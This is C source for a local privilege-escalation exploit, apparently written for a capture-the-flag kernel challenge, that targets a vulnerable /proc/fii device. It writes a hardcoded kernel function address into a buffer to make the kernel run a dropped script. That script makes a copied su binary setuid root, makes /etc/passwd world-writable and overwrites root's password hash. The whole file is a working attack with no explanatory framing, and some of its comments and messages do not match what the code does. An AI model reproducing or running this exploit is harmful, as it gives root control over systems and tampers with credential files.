#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>

int main() {
    int fd = open("/proc/fii", O_RDWR);
    if (fd == -1) {
        perror("Could not open the device!");
        return -1;
    }

    printf("[*] Reading the memory\n");
    uint8_t buffer[1024];
    printf("[*] Making a copy of busybox to /tmp/su!\n");
    system("/bin/cp /bin/su /tmp/su");
    strcpy((char *)buffer, "/bin/sh /tmp/script.sh");
    *(uint64_t *)(buffer + 256) = (uint64_t)0xffffffff81097c68; // set the address to run_cmd 
    
    FILE *f = fopen("/tmp/script.sh", "w");
    fprintf(f, "#!/bin/sh\n"
            "chown root /tmp/su\n"
            "chmod 7777 /tmp/su\n"
            "chmod 666 /etc/passwd\n"
            "sed 's/root:x:0:0:root:\\/root:\\/bin\\/sh/root:$1$i7XgAiIL$IbBegm53PrlZvS4N3vfNW0:0:0:root:\\/root:\\/bin\\/sh/g' /etc/passwd > /tmp/passwd\n"
            "mv /tmp/passwd /etc/passwd\n"
            "rm /tmp/script.sh"
    );
    fclose(f);
    
    printf("[+] Dropped script /tmp/script.sh\n");

    printf("[*] Executing the malicious script!\n");
    write(fd, buffer, 264);
    printf("[*] Done! Execute /tmp/su for the setuid binary with password 'x'!\n");

    return 0;
}
